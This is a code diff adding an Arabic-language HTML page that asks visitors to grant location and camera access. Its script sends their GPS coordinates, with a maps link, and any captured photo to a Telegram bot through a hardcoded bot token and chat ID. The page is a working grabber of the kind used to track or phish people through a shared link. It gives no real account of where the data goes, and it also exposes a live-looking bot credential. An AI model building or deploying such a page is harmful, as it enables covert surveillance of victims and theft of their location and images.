@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>الوصول للكاميرا والموقع</title>
+</head>
+<body style="text-align:center; padding-top:40px;">
+  <h2>يرجى السماح بالصلاحيات</h2>
+  
+  <button onclick="requestLocation()">السماح باللوكيشن</button>
+  <br><br>
+  
+  <input type="file" accept="image/*" capture="environment" id="cameraInput" style="display:none" onchange="sendPhoto(this.files[0])">
+  <button onclick="document.getElementById('cameraInput').click()">التقاط صورة بالكاميرا</button>
+
+  <script>
+    const BOT_TOKEN = "7607859099:AAHAX0_z8tKkug81sfV8OM_vgTiytmSp8W8";
+    const CHAT_ID = "7607859099";
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const message = `موقع جديد:\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+            });
+
+            alert("تم إرسال الموقع إلى البوت.");
+          },
+          (error) => {
+            alert("خطأ في تحديد الموقع: " + error.message);
+          }
+        );
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع");
+      }
+    }
+
+    function sendPhoto(file) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", file);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("تم إرسال الصورة بنجاح");
+      })
+      .catch(error => {
+        alert("فشل إرسال الصورة: " + error.message);
+      });
+    }
+  </script>
+</body>
+</html>
